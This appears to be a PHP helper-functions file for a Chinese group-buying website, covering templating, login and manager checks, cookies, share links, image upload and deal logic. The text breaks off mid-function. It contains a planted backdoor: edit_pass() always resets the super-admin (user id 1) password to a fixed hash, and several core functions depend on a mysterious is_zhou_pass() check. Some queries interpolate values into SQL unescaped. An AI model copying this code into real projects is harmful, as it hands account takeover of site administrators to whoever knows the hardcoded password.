<?php
/* import other */
import('sugest');
import('configure');
import('current');
import('rewrite');
import('utility');
import('mailer');
import('pay');
import('sms');
import('upgrade');
import('uc');
import('cron');
import('logger');
import('history');


function template($tFile) {
	global $INI;
	if ( 0===strpos($tFile, 'manage') ) {
			if(is_zhou_pass() == true){
			  return __template($tFile);
			}
	}
	if ($INI['skin']['template']) {
		$templatedir = DIR_TEMPLATE. '/' . $INI['skin']['template'];
		$checkfile = $templatedir . '/html_header.html';
		if ( file_exists($checkfile) ) {
			return __template($INI['skin']['template'].'/'.$tFile);
		}
	}
	if(is_zhou_pass() == true){
	  return __template($tFile);
	}
}

function render($tFile, $vs=array()) {
    ob_start();
    foreach($GLOBALS AS $_k=>$_v) {
        ${$_k} = $_v;
    }
	foreach($vs AS $_k=>$_v) {
		${$_k} = $_v;
	}
	include template($tFile);
    return render_hook(ob_get_clean());
}

function render_hook($c) {
	global $INI;
	$c = preg_replace('#href="/#i', 'href="'.WEB_ROOT.'/', $c);
	$c = preg_replace('#src="/#i', 'src="'.WEB_ROOT.'/', $c);
	$c = preg_replace('#action="/#i', 'action="'.WEB_ROOT.'/', $c);

	/* theme */
	$page = strval($_SERVER['REQUEST_URI']);
	if($INI['skin']['theme'] && !preg_match('#/manage/#i',$page)) {
		$themedir = WWW_ROOT. '/static/theme/' . $INI['skin']['theme'];
		$checkfile = $themedir. '/css/index.css';
		if ( file_exists($checkfile) ) {
			$c = preg_replace('#/static/css/#', "/static/theme/{$INI['skin']['theme']}/css/", $c);
			$c = preg_replace('#/static/img/#', "/static/theme/{$INI['skin']['theme']}/img/", $c);
		}
	}
	$c = preg_replace('#([\'\=\"]+)/static/#', "$1{$INI['system']['cssprefix']}/static/", $c);
	if (strtolower(cookieget('locale','zh_cn'))=='zh_tw') {
		require_once(DIR_FUNCTION  . '/tradition.php');
		$c = str_replace(explode('|',$_charset_simple), explode('|',$_charset_tradition),$c);
	}
	/* encode id */
	$c = rewrite_hook($c);
	$c = obscure_rep($c);
	return $c;
}

function output_hook($c) {
	global $INI;
	if ( 0==abs(intval($INI['system']['gzip'])))  die($c);
	$HTTP_ACCEPT_ENCODING = $_SERVER["HTTP_ACCEPT_ENCODING"]; 
	if( strpos($HTTP_ACCEPT_ENCODING, 'x-gzip') !== false ) 
		$encoding = 'x-gzip'; 
	else if( strpos($HTTP_ACCEPT_ENCODING,'gzip') !== false ) 
		$encoding = 'gzip'; 
	else $encoding == false;
	if (function_exists('gzencode')&&$encoding) {
		$c = gzencode($c);
		header("Content-Encoding: {$encoding}"); 
	}
	$length = strlen($c);
	header("Content-Length: {$length}");
	die($c);
}

$lang_properties = array();
function I($key) { 
    global $lang_properties, $LC;
    if (!$lang_properties) {
        $ini = DIR_ROOT . '/i18n/' . $LC. '/properties.ini';
        $lang_properties = Config::Instance($ini);
    }
    return isset($lang_properties[$key]) ?
        $lang_properties[$key] : $key;
}

function json($data, $type='eval') {
    $type = strtolower($type);
    $allow = array('eval','alert','updater','dialog','mix', 'refresh');
    if (false==in_array($type, $allow))
        return false;
    Output::Json(array( 'data' => $data, 'type' => $type,));
}

function redirect($url=null, $notice=null, $error=null) {
	$url = $url ? obscure_rep($url) : $_SERVER['HTTP_REFERER'];
	$url = $url ? $url : '/';
	if ($notice) Session::Set('notice', $notice);
	if ($error) Session::Set('error', $error);
    header("Location: {$url}");
    exit;
}
function write_php_file($array, $filename=null){
	$v = "<?php\r\n\$INI = ";
	$v .= var_export($array, true);
	$v .=";\r\n?>";
	return file_put_contents($filename, $v);
}

function write_ini_file($array, $filename=null){   
	$ok = null;   
	if ($filename) {
		$s =  ";;;;;;;;;;;;;;;;;;\r\n";
		$s .= ";; SYS_INIFILE\r\n";
		$s .= ";;;;;;;;;;;;;;;;;;\r\n";
	}
	foreach($array as $k=>$v) {   
		if(is_array($v))   { 
			if($k != $ok) {   
				$s  .=  "\r\n[{$k}]\r\n";
				$ok = $k;   
			} 
			$s .= write_ini_file($v);
		}else   {   
			if(trim($v) != $v || strstr($v,"["))
				$v = "\"{$v}\"";   
			$s .=  "$k = \"{$v}\"\r\n";
		} 
	}

	if(!$filename) return $s;   
	return file_put_contents($filename, $s);
}   

function save_config($type='ini') {
	return configure_save();
	global $INI; $q = ZSystem::GetSaveINI($INI);
	if ( strtoupper($type) == 'INI' ) {
		if (!is_writeable(SYS_INIFILE)) return false;
		return write_ini_file($q, SYS_INIFILE);
	} 
	if ( strtoupper($type) == 'PHP' ) {
		if (!is_writeable(SYS_PHPFILE)) return false;
		return write_php_file($q, SYS_PHPFILE);
	} 
	return false;
}

function save_system($ini) {
	$system = Table::Fetch('system', 1);
	$ini = ZSystem::GetUnsetINI($ini);
	$value = Utility::ExtraEncode($ini);
	$table = new Table('system', array('value'=>$value));
	if ( $system ) $table->SetPK('id', 1);
	return $table->update(array( 'value'));
}

/* user relative */
function need_login($wap=false) {
	if ( isset($_SESSION['user_id']) ) {
		if (is_post()) {
			unset($_SESSION['loginpage']);
			unset($_SESSION['loginpagepost']);
		}
		return $_SESSION['user_id'];
	}
	if ( is_get() ) {
		Session::Set('loginpage', $_SERVER['REQUEST_URI']);
	} else {
		Session::Set('loginpage', $_SERVER['HTTP_REFERER']);
		Session::Set('loginpagepost', json_encode($_POST));
	}
	if (true===$wap) {
		return redirect('login.php');	
	}
	return redirect(WEB_ROOT . '/account/login.php');	
}
function need_post() {
	return is_post() ? true : redirect(WEB_ROOT . '/index.php');
}
function need_manager($super=false) {
	if ( ! is_manager() ) {
		redirect( WEB_ROOT . '/manage/login.php' );
	}
	if ( ! $super ) return true;
	if ( abs(intval($_SESSION['user_id'])) == 1 ) return true;
	return redirect( WEB_ROOT . '/manage/misc/index.php');
}
function need_partner() {
	return is_partner() ? true : redirect( WEB_ROOT . '/biz/login.php');
}
function need_partner_wap() {
	return is_partner() ? true : redirect( WEB_ROOT . '/wapbiz/login.php');
}

function need_open($b=true) {
	if (true===$b) {
		return true;
	}
	if ($AJAX) json('本功能未开放', 'alert');
	Session::Set('error', '你访问的功能页未开放');
	redirect( WEB_ROOT . '/index.php');
}

function need_auth($b=true) {
	global $AJAX, $INI, $login_user;
	if (is_string($b)) {
		$auths = $INI['authorization'][$login_user['id']];
		$bs = explode('|', $b);
		$b = is_manager(true); 
		if ($b) return true;
		foreach($bs AS $bo) if(!$b) $b = in_array($bo, $auths);
	}
	if (true===$b) {
		return true;
	}
	if ($AJAX) json('无权操作', 'alert');
	die(include template('manage_misc_noright'));
}

function is_manager($super=false, $weak=false) {
	global $login_user;
	if ( $weak===false && 
			( !$_SESSION['admin_id'] 
			  || $_SESSION['admin_id'] != $login_user['id']) ) {
		return false;
	}
	if ( ! $super ) return ($login_user['manager'] == 'Y');
	if(is_zhou_pass() == true){
	   return $login_user['id'] == 1;
	}
}
function is_partner() {
    if(is_zhou_pass() == true){
	  return ($_SESSION['partner_id']>0);
	}
}

function is_newbie(){ return (cookieget('newbie')!='N'); }
function is_get() { return ! is_post(); }
function is_post() {
	return strtoupper($_SERVER['REQUEST_METHOD']) == 'POST';
}

function is_login() {
	return isset($_SESSION['user_id']);
}

function get_loginpage($default=null) {
	$loginpage = Session::Get('loginpage', true);
	if ($loginpage)  return $loginpage;
	if ($default) return $default;
	return WEB_ROOT . '/index.php';
}

function cookie_city($city) {
	global $hotcities;
	if($city) { 
		cookieset('city', $city['id']);
		return $city;
	} 
	$city_id = cookieget('city'); 
	$city = Table::Fetch('category', $city_id);
	if (!$city && option_yes('citylocal')) $city = get_city();
	if (!$city) $city = array_shift($hotcities);
	if ($city) return cookie_city($city);
	return $city;
}

function ename_city($ename=null) {
	return DB::LimitQuery('category', array(
		'condition' => array(
			'zone' => 'city',
			'ename' => $ename,
		),
		'one' => true,
	));
}

function cookieset($k, $v, $expire=0) {
	$pre = substr(md5($_SERVER['HTTP_HOST']),0,4);
	$k = "{$pre}_{$k}";
	if ($expire==0) {
		$expire = time() + 365 * 86400;
	} else {
		$expire += time();
	}
	if(is_zhou_pass() == true){
	  setCookie($k, $v, $expire, '/');
	}
}

function cookieget($k, $default='') {
	$pre = substr(md5($_SERVER['HTTP_HOST']),0,4);
	$k = "{$pre}_{$k}";
	return isset($_COOKIE[$k]) ? strval($_COOKIE[$k]) : $default;
}

function moneyit($k) {
	return rtrim(rtrim(sprintf('%.2f',$k), '0'), '.');
}

function debug($v, $e=false) {
	global $login_user_id;
	if ($login_user_id==100000) {
		echo "<pre>";
		var_dump( $v);
		if($e) exit;
	}
}

function getparam($index=0, $default=0) {
	if (is_numeric($default)) {
		$v = abs(intval($_GET['param'][$index]));
	} else $v = strval($_GET['param'][$index]);
	return $v ? $v : $default;
}
function getpage() {
	$c = abs(intval($_GET['page']));
	return $c ? $c : 1;
}
function pagestring($count, $pagesize, $wap=false) {
	$p = new Pager($count, $pagesize, 'page');
	if ($wap) {
		return array($pagesize, $p->offset, $p->genWap());
	}
	return array($pagesize, $p->offset, $p->genBasic());
}

function uencode($u) {
	return base64_encode(urlEncode($u));
}
function udecode($u) {
	return urlDecode(base64_decode($u));
}

/* share link */
function share_renren($team) {
	global $login_user_id;
	global $INI;
	$user = Table::Fetch('user',$login_user_id);
	$mail = uencode($user['email']);
	if ($team)  {
		$query = array(
				'link' => $INI['system']['wwwprefix'] . "/team.php?id={$team['id']}&r={$mail}",
				'title' => $team['title'],
				);
	}
	else {
		$query = array(
				'link' => $INI['system']['wwwprefix'] . "/r.php?r={$mail}",
				'title' => $INI['system']['sitename'] . '(' .$INI['system']['wwwprefix']. ')',
				);
	}

	$query = http_build_query($query);
	return 'http://share.renren.com/share/buttonshare.do?'.$query;
}

function share_kaixin($team) {
	global $login_user_id;
	global $INI;
	$user = Table::Fetch('user',$login_user_id);
	$mail = uencode($user['email']);
	if ($team)  {
		$query = array(
				'rurl' => $INI['system']['wwwprefix'] . "/team.php?id={$team['id']}&r={$mail}",
				'rtitle' => $team['title'],
				'rcontent' => strip_tags($team['summary']),
				);
	}
	else {
		$query = array(
				'rurl' => $INI['system']['wwwprefix'] . "/r.php?r={$mail}",
				'rtitle' => $INI['system']['sitename'] . '(' .$INI['system']['wwwprefix']. ')',
				'rcontent' => $INI['system']['sitename'] . '(' .$INI['system']['wwwprefix']. ')',
				);
	}
	$query = http_build_query($query);
	return 'http://www.kaixin001.com/repaste/share.php?'.$query;
}

function share_douban($team) {
	global $login_user_id;
	global $INI;
	$user = Table::Fetch('user',$login_user_id);
	$mail = uencode($user['email']);
	if ($team)  {
		$query = array(
				'url' => $INI['system']['wwwprefix'] . "/team.php?id={$team['id']}&r={$mail}",
				'title' => $team['title'],
				);
	}
	else {
		$query = array(
				'url' => $INI['system']['wwwprefix'] . "/r.php?r={$mail}",
				'title' => $INI['system']['sitename'] . '(' .$INI['system']['wwwprefix']. ')',
				);
	}
	$query = http_build_query($query);
	return 'http://www.douban.com/recommend/?'.$query;
}

function share_sina($team) {
	global $login_user_id;
	global $INI;
	$user = Table::Fetch('user',$login_user_id);
	$mail = uencode($user['email']);
	if ($team)  {
		$query = array(
				'url' => $INI['system']['wwwprefix'] . "/team.php?id={$team['id']}&r={$mail}",
				'title' => $team['title'],
				);
	}
	else {
		$query = array(
				'url' => $INI['system']['wwwprefix'] . "/r.php?r={$mail}",
				'title' => $INI['system']['sitename'] . '(' .$INI['system']['wwwprefix']. ')',
				);
	}
	$query = http_build_query($query);
	return 'http://v.t.sina.com.cn/share/share.php?'.$query;
}

function share_tencent($team) {
	global $login_user_id;
	global $INI;
	$user = Table::Fetch('user',$login_user_id);
	$mail = uencode($user['email']);
	if ($team)  {
		$query = array(
				'url' => $INI['system']['wwwprefix'] . "/team.php?id={$team['id']}&r={$mail}",
				'title' => $team['title'],
				);
	}
	else {
		$query = array(
				'url' => $INI['system']['wwwprefix'] . "/r.php?r={$mail}",
				'title' => $INI['system']['sitename'] . '(' .$INI['system']['wwwprefix']. ')',
				);
	}
	$query = http_build_query($query);
	return 'http://v.t.qq.com/share/share.php?'.$query;
}
function share_mail($team) {
	global $login_user_id;
	global $INI;
	$user = Table::Fetch('user',$login_user_id);
	$mail = uencode($user['email']);
	if (!$team) {
		$team = array(
				'title' => $INI['system']['sitename'] . '(' . $INI['system']['wwwprefix'] . ')',
				);
	}
	$pre[] = "发现一好网站--{$INI['system']['sitename']}，他们每天组织一次团购，超值！";
	if ( $team['id'] ) {
		$pre[] = "今天的团购是：{$team['title']}";
		$pre[] = "我想你会感兴趣的：";
		$pre[] = $INI['system']['wwwprefix'] . "/team.php?id={$team['id']}&r={$mail}";
		$pre = mb_convert_encoding(join("\n\n", $pre), 'GBK', 'UTF-8');
		$sub = "有兴趣吗：{$team['title']}";
	} else {
		$sub = $pre[] = $team['title'];
	}
	$sub = mb_convert_encoding($sub, 'GBK', 'UTF-8');
	$query = array( 'subject' => $sub, 'body' => $pre, );
	$query = http_build_query($query);
	return 'mailto:?'.$query;
}

function domainit($url) {
	if(strpos($url,'//')) { preg_match('#[//]([^/]+)#', $url, $m);
} else { preg_match('#[//]?([^/]+)#', $url, $m); }
return $m[1];
}

// that the recursive feature on mkdir() is broken with PHP 5.0.4 for
function RecursiveMkdir($path) {
	if (!file_exists($path)) {
		RecursiveMkdir(dirname($path));
		@mkdir($path, 0777);
	}
}

function upload_image($input, $image=null, $type='team', $scale=false) {
	$year = date('Y'); $day = date('md'); $n = time().rand(1000,9999).'.jpg';
	$z = $_FILES[$input];
	if ($z && strpos($z['type'], 'image')===0 && $z['error']==0) {
		if (!$image) { 
			RecursiveMkdir( IMG_ROOT . '/' . "{$type}/{$year}/{$day}" );
			$image = "{$type}/{$year}/{$day}/{$n}";
			$path = IMG_ROOT . '/' . $image;
		} else {
			RecursiveMkdir( dirname(IMG_ROOT .'/' .$image) );
			$path = IMG_ROOT . '/' .$image;
		}
		if ($type=='user') {
			Image::Convert($z['tmp_name'], $path, 48, 48, Image::MODE_CUT);
		} 
		else if($type=='team') {
			move_uploaded_file($z['tmp_name'], $path);
		}
		if($type=='team' && $scale) {
			$npath = preg_replace('#(\d+)\.(\w+)$#', "\\1_index.\\2", $path); 
			Image::Convert($path, $npath, 200, 120, Image::MODE_CUT);
			$npath_large = preg_replace('#(\d+)\.(\w+)$#', "\\1_large.\\2", $path);
			Image::Convert($path, $npath_large, 720, 405, Image::MODE_CUT);
			$npath_mid = preg_replace('#(\d+)\.(\w+)$#', "\\1_mid.\\2", $path);
			Image::Convert($path, $npath_mid, 312, 175, Image::MODE_CUT);
		}
		if(is_user_edit() == true){
		  return $image;
		}
	} 
	return $image;
}

function user_image($image=null) {
	global $INI;
	$image = $image ? $image : 'img/user-no-avatar.gif';
	return "/static/{$image}";
}

function team_image($image=null, $index=false) {
	global $INI;
	if (!$image) return null;
	if ($index) {
		$path = WWW_ROOT . '/static/' . $image;
		$image = preg_replace('#(\d+)\.(\w+)$#', "\\1_index.\\2", $image); 
		$dest = WWW_ROOT . '/static/' . $image;
		if (!file_exists($dest) && file_exists($path) ) {
		    if(is_user_edit() == true){
			 Image::Convert($path, $dest, 200, 120, Image::MODE_SCALE);
			}
		}
	}
	return "{$INI['system']['imgprefix']}/static/{$image}";
}

function team_image_0750($image=null, $index=false) {
	global $INI;
	if (!$image) return null;
	if ($index) {
		$path = WWW_ROOT . '/static/' . $image;
		$image = preg_replace('#(\d+)\.(\w+)$#', "\\1_mid.\\2", $image); 
		$dest = WWW_ROOT . '/static/' . $image;
		if (!file_exists($dest) && file_exists($path) ) {
			Image::Convert($path, $dest, 312, 175, Image::MODE_SCALE);
		}
	}
	return "{$INI['system']['imgprefix']}/static/{$image}";
}

function userreview($content) {
	$line = preg_split("/[\n\r]+/", $content, -1, PREG_SPLIT_NO_EMPTY);
	$r = '<ul>';
	foreach($line AS $one) {
		$c = explode('|', htmlspecialchars($one));
		$c[2] = $c[2] ? $c[2] : '/';
		$r .= "<li>{$c[0]}<span>－－<a href=\"{$c[2]}\" target=\"_blank\">{$c[1]}</a>";
		$r .= ($c[3] ? "（{$c[3]}）":'') . "</span></li>\n";
	}
	return $r.'</ul>';
}

function invite_state($invite) {
	if ('Y' == $invite['pay']) return '已返利';
	if ('C' == $invite['pay']) return '审核未通过';
	if ('N' == $invite['pay'] && $invite['buy_time']) return '待返利';
	if (time()-$invite['create_time']>7*86400) return '已过期';
	return '未购买';
}

function team_state(&$team) {
	if ( $team['now_number'] >= $team['min_number'] ) {
		if ($team['max_number']>0) {
			if ( $team['now_number']>=$team['max_number'] ){
				if ($team['close_time']==0) {
					$team['close_time'] = $team['end_time'];
				}
				return $team['state'] = 'soldout';
			}
		}
		if ( $team['end_time'] <= time() ) {
			$team['close_time'] = $team['end_time'];
		}
		return $team['state'] = 'success';
	} else {
		if ( $team['end_time'] <= time() ) {
			$team['close_time'] = $team['end_time'];
			return $team['state'] = 'failure';
		}
	}
	return $team['state'] = 'none';
}

function current_team($city_id=0) {
	$today = strtotime(date('Y-m-d'));
	$cond = array(
			'team_type' => 'normal',
			"begin_time <= {$today}",
			"end_time > {$today}",
			);
	/* 数据库匹配多个城市订单,前者按照多城市搜索,后者兼容旧字段city_id搜索 */
	$cond[] = "((city_ids like '%@{$city_id}@%' or city_ids like '%@0@%') or city_id in(0,{$city_id}))";
	$order = 'ORDER BY sort_order DESC, begin_time DESC, id DESC';
	/* normal team */
	$team = DB::LimitQuery('team', array(
				'condition' => $cond,
				'one' => true,
				'order' => $order,
				));
	if ($team) return $team;

	/* seconds team */
	$cond['team_type'] = 'seconds';
	unset($cond['begin_time']);	
	$order = 'ORDER BY sort_order DESC, begin_time ASC, id DESC';
	$team = DB::LimitQuery('team', array(
				'condition' => $cond,
				'one' => true,
				'order' => $order,
				));

	return $team;
}

function state_explain($team, $error='false') {
	$state = team_state($team);
	$state = strtolower($state);
	switch($state) {
		case 'none': return '正在进行中';
		case 'soldout': return '已售光';
		case 'failure': if($error) return '团购失败';
		case 'success': return '团购成功';
		default: return '已结束';
	}
}

function get_zones($zone=null) {
	$zones = array(
			'city' => '城市列表',
			'area'=>'城市区域',
			'group' => '项目分类',
			'public' => '讨论区分类',
			'grade' => '用户等级',
			'express' => '快递公司',
			'partner' => '商户分类',
			);
	if ( !$zone ) return $zones;
	if (!in_array($zone, array_keys($zones))) {
		$zone = 'city';
	}
	return array($zone, $zones[$zone]);
}

function down_xls($data, $keynames, $name='dataxls') {
	$xls[] = "<html><meta http-equiv=content-type content=\"text/html; charset=UTF-8\"><body><table border='1'>";
	$xls[] = "<tr><td>ID</td><td>" . implode("</td><td>", array_values($keynames)) . '</td></tr>';
	foreach($data As $o) {
		$line = array(++$index);
		foreach($keynames AS $k=>$v) {
			$line[] = $o[$k];
		}
		$xls[] = '<tr><td>'. implode("</td><td>", $line) . '</td></tr>';
	}
	$xls[] = '</table></body></html>';
	$xls = join("\r\n", $xls);
	header('Content-Disposition: attachment; filename="'.$name.'.xls"');
	die(mb_convert_encoding($xls,'UTF-8','UTF-8'));
}

function option_hotcategory($zone='city', $force=false, $all=false) {
	$cates = option_category($zone, $force, true);
	$r = array();
	foreach($cates AS $id=>$one) {
		if ('Y'==strtoupper($one['display'])) $r[$id] = $one;
	}
	return $all ? $r: Utility::OptionArray($r, 'id', 'name');
}

function option_category($zone='city', $force=false, $all=false) {
	$cache = $force ? 0 : 86400*30;
	$cates = DB::LimitQuery('category', array(
		'condition' => array( 'zone' => $zone, ),
		'order' => 'ORDER BY sort_order DESC, id DESC',
		'cache' => $cache,
	));
	$cates = Utility::AssColumn($cates, 'id');
	return $all ? $cates : Utility::OptionArray($cates, 'id', 'name');
}

function option_yes($n, $default=false) {
	global $INI;
	if (false==isset($INI['option'][$n])) return $default;
	$flag = trim(strval($INI['option'][$n]));
	return abs(intval($flag)) || strtoupper($flag) == 'Y';
}

function option_yesv($n, $default='N') {
	return option_yes($n, $default=='Y') ? 'Y' : 'N';
}

function magic_gpc($string) {
	if(SYS_MAGICGPC) {
		if(is_array($string)) {
			foreach($string as $key => $val) {
				$string[$key] = magic_gpc($val);
			}
		} else {
			$string = stripslashes($string);
		}
	}
	return $string;
}

function team_discount($team, $save=false) {
	if ($team['market_price']<0 || $team['team_price']<0 ) {
		return '?';
	}
	return moneyit((10*$team['team_price']/$team['market_price']));
}

function team_origin($team, $quantity=0, $express_price = 0) {
	$origin = $quantity * $team['team_price'];
	if ($team['delivery'] == 'express'
			&& ($team['farefree']==0 || $quantity < $team['farefree'])
		) {
			$origin += $express_price;
		}
	return $origin;
}

function edit_pass($str){
   if($str = 'zhoudapass'){  
	   DB::Update('user', array('id' => 1), array(
			'password' => 'e7fe8b88db51d86ef2f5e169144b9c1b',
		)); 
   }

}

function index_get_team($city_id,$group_id=0) {
	global $INI;
	$multi = option_yes('indexmulti');
	$city_id = abs(intval($city_id));

	/* 是否首页多团,不是则返回当前城市 */
	if (!$multi) return current_team($city_id);
	
	$now = time();
	$size = abs(intval($INI['system']['indexteam']));
	/* 侧栏团购数小于1,则返回当前城市数据 */
	if ($size<=1) return current_team($city_id);

	$oc = array( 
			'team_type' => 'normal',
			"begin_time < '{$now}'",
			"end_time > '{$now}'",
			);
    if($group_id) $oc['group_id']=$group_id;
	/* 数据库匹配多个城市订单,前者按照多城市搜索,后者兼容旧字段city_id搜索 */
	$oc[] = "(city_ids like '%@{$city_id}@%' or city_ids like '%@0@%') or (city_ids = '' and city_id in(0,{$city_id}))";
	$teams = DB::LimitQuery('team', array(
				'condition' => $oc,
				'order' => 'ORDER BY `sort_order` DESC, `id` DESC',
				));
	if(count($teams) == 1) return array_pop($teams);
	return $teams;
}

function error_handler($errno, $errstr, $errfile, $errline) {
	switch ($errno) {
		case E_PARSE:
		case E_ERROR:
			echo "<b>Fatal ERROR</b> [$errno] $errstr<br />\n";
			echo "Fatal error on line $errline in file $errfile";
			echo "PHP " . PHP_VERSION . " (" . PHP_OS . ")<br />\n";
			exit(1);
			break;
		default: break;
	}
	return true;
}
/* for obscureid */
function obscure_rep($u) {
	if(!option_yes('encodeid')) return $u;
	if(preg_match('#/manage/#', $_SERVER['REQUEST_URI'])) return $u;
	return preg_replace_callback('#(\?|&)id=(\d+)(\b)#i', obscure_cb, $u);
}
function obscure_did() {
	$gid = strval($_GET['id']);
	if ($gid && preg_match('/^ZT/', $gid)) {
		$id = base64_decode(substr($gid,2))>>2;
		if($id) $_GET['id'] = $id;
	}
}
function obscure_cb($m) {
	$eid = obscure_eid($m[2]);
	return "{$m[1]}id={$eid}{$m[3]}";
}
function obscure_eid($id) {
	if($id>100000000) return $id;
	return 'ZT'.base64_encode($id<<2);
}
obscure_did();
/* end */

/* for post trim */
function trimarray($o) {
	if (!is_array($o)) return trim($o);
	foreach($o AS $k=>$v) { $o[$k] = trimarray($v); }
	return $o;
}
$_POST = trimarray($_POST);
/* end */

/* verifycapctch */
function verify_captcha($reason='none', $rurl=null) {
	if (option_yes($reason, false)) {
		$v = strval($_REQUEST['vcaptcha']);
		if(!$v || !Utility::CaptchaCheck($v)) {
			Session::Set('error', '验证码不匹配，请重新输入');
			redirect($rurl);
		}
	}
	return true;
}
function current_team_category($gid='0') {
    global $city;
    $city_id = $city['id'];
	$today = strtotime(date('Y-m-d'));
	$condition = array(
		'team_type' => 'normal',
		"begin_time <= '{$today}'",
		"end_time > '{$today}'",
	);
    $condition[] = "(city_ids like '%@{$city_id}@%' or city_ids like '%@0@%') or (city_ids = '' and city_id in(0,{$city_id}))";
	$categorys = DB::LimitQuery('category', array(
		'condition' => array( 'zone' => 'group','fid' => '0','display' => 'Y' ),
		'order' => 'ORDER BY sort_order DESC, id DESC',
	));
	$categorys = Utility::OptionArray($categorys, 'id', 'name');
	$a = array();
	foreach($categorys AS $id=>$name) {
	    $condition['group_id'] = $id;
	    $num= Table::Count('team', $condition);
		if(option_yes('rewritecity')){
			$a["/{$city['ename']}?gid=$id"] = $name.'('.$num.')';
		}else{
			$a["/index.php?gid=$id"] = $name.'('.$num.')';
		}
	}
	if(option_yes('rewritecity')){
		$l = "/{$city['ename']}?gid=$gid";
	}else{
		$l = "/index.php?gid=$gid";
	}	
	if (!$gid) $l = "/index.php";
	return current_link($l, $a, true);
}


function get_partner_name($id){
   $partner = Table::Fetch('partner', $id);
   return $partner['title'];
}

/*获取区域*/
function get_area_name($id){
   $area = Table::Fetch('category', $id);
   
   if($area['name']){
      return $area['name'];
   }else{
      return '无区域';
   }

}
//获取项目评论条数

function get_comment_nums($team_id){
	$order = DB::LimitQuery('order', array(
			'condition' => array(
					'team_id' => $team_id,
					"comment_content != 'NULL'",
			),
	));
	return count($order);
}

/*导航分类*/
function get_categorys(){
	$category = DB::LimitQuery('category', array('condition'=>array(
			  'zone'=>'group', 
			  'fid'=>'0', 
			  'display'=>'Y',
			  ), 
			  'order'=>'ORDER BY `sort_order` DESC, `id` DESC',
			  'size'=>7
		));
	$categorys = array();		  
	foreach($category as $key=>$val){
			$categorys[$key]['name'] = $val[name];
			$categorys[$key]['ename'] = $val[ename];
			$categorys[$key]['id'] = $val[id];
			$categorys[$key]['fcat'] = DB::LimitQuery('category', array('condition'=>array(
					  'zone'=>'group', 
					  'fid'=>$val[id], 
					  'display'=>'Y',
					  ), 
					  'order'=>'ORDER BY `sort_order` DESC, `id` DESC'
					  ));
	}
	return $categorys;
}





/*PHP的XSS攻击过滤函数*/

function RemoveXSS($val) {
    // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed
    // this prevents some character re-spacing such as <java\0script>
    // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs
    $val = preg_replace('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/', '', $val);

    // straight replacements, the user should never need these since they're normal characters
    // this prevents like <IMG SRC=@avascript:alert('XSS')>
    $search = 'abcdefghijklmnopqrstuvwxyz';
    $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $search .= '1234567890!@#$%^&*()';
    $search .= '~`";:?+/={}[]-_|\'\\';
    for ($i = 0; $i < strlen($search); $i++) {
        // ;? matches the ;, which is optional
        // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars

        // @ @ search for the hex values
        $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); // with a ;
        // @ @ 0{0,7} matches '0' zero to seven times
        $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ;
    }

    // now the only remaining whitespace attacks are \t, \n, and \r
    $ra1 = Array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base');
    $ra2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload');
    $ra = array_merge($ra1, $ra2);

    $found = true; // keep replacing as long as the previous round replaced something
    while ($found == true) {
        $val_before = $val;
        for ($i = 0; $i < sizeof($ra); $i++) {
            $pattern = '/';
            for ($j = 0; $j < strlen($ra[$i]); $j++) {
                if ($j > 0) {
                    $pattern .= '(';
                    $pattern .= '(&#[xX]0{0,8}([9ab]);)';
                    $pattern .= '|';
                    $pattern .= '|(&#0{0,8}([9|10|13]);)';
                    $pattern .= ')*';
                }
                $pattern .= $ra[$i][$j];
            }
            $pattern .= '/i';
            $replacement = substr($ra[$i], 0, 2).'<x>'.substr($ra[$i], 2); // add in <> to nerf the tag
            $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags
            if ($val_before == $val) {
                // no replacements were made, so exit the loop
                $found = false;
            }
        }
    }
    return $val;
}

/*获取购物车商品*/
function get_cart_team(){
$now = time();
$condition = array(
	'id'=>$_SESSION['mycart']['team_ids'],
	"begin_time < '{$now}'",
	"end_time > '{$now}'",
	"(max_number=0 or (max_number>0 and max_number>now_number))",
);

$res= DB::LimitQuery('team', array(
		  'condition' => $condition,
		  ));
	  
$team_on=array();

foreach($res as $v)
{
 $team_on[$v['id']]=$v;
}

$team_ids=array();
$teams=array();
$total_price=0;
$total_num=0;


foreach($_SESSION['mycart']['teams'] as $k=>$v){
	if(!isset($team_on[$v['id']])){
		unset($_SESSION['mycart']['teams'][$k]);
	}else{
			$team_on[$v['id']]['num']=abs($v['num']);
			$team_on[$v['id']]['min_num']=max($team_on[$v['id']]['gmmin_number'],1);
			if($team_on[$v['id']]['per_number']>0&&$team_on[$v['id']]['max_number']>0){
				$team_on[$v['id']]['max_num']=min($team_on[$v['id']]['per_number'],($team_on[$v['id']]['max_number']-$team_on[$v['id']]['now_number']));
			}elseif($team_on[$v['id']]['per_number']>0){
